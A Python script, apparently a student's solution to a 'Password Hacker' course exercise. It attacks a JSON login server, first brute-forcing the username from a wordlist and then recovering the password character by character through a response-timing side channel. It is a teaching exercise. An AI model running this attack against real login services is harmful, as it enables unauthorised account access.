from sys import argv
from socket import socket
from string import ascii_lowercase, digits, ascii_uppercase
from time import time
import json

def logins():
    with open("C:/Users/Zloy-/PycharmProjects/Password Hacker (Python)6/"
                    "Password Hacker (Python)/task/logins.txt", 'r') as f:
        brut_force_login = f.read().splitlines()
        return brut_force_login

brut_force = logins()

with socket() as admin_socket:
    localhost = argv[1]
    port = int(argv[2])
    admin_socket.connect((localhost, port))

    Flag = True
    symbol = ascii_uppercase + ascii_lowercase + digits
    correct_login = ''
    correct_password = ''
    st = ''

    for login in brut_force:
        admin_socket.send(json.dumps({"login": login, "password": " "}).encode())
        if json.loads(admin_socket.recv(1024).decode()) == {"result": "Wrong password!"}:
            correct_login = login
            break
    while Flag:
        for c in symbol:
            admin_socket.send(json.dumps({"login": correct_login, "password": st + c}).encode())
            time_start = time()
            object = json.loads(admin_socket.recv(1024).decode())
            time_end = time()
            if time_end - time_start >= 0.1:
                st += c
                break
            elif object == {"result": "Connection success!"}:
                st += c
                correct_password = st
                Flag = False
                break
    print(json.dumps({"login": correct_login, "password": correct_password}))